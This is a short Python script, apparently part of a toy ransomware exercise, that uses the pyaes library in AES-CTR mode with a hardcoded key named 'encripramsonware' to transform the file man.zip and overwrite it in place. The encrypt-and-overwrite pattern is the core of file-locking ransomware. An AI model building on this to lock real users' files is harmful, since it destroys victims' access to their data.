import pyaes

with open('man.zip','rb') as f:
	file = f.read()

key =b'encripramsonware' # 16 bytes cripto
aes = pyaes.AESModeOfOperationCTR(key)
encrypted = aes.decrypt(file)

with open('man.zip','wb') as f:
	f.write(encrypted)
